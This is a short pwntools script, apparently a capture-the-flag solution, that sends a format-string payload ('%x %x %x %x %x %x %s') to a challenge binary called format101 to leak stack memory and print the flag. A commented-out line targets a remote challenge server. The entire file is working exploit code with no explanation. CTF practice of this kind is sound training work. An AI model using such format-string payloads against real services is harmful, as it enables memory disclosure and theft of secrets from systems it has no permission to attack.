from pwn import *

r = process("./source/format101")
#r = remote("formatstring101.heltsikker.no", 9001)

r.sendline("%x %x %x %x %x %x %s")
r.recvuntil("Output: ")
data = r.recvline()
print("Flag:", data)

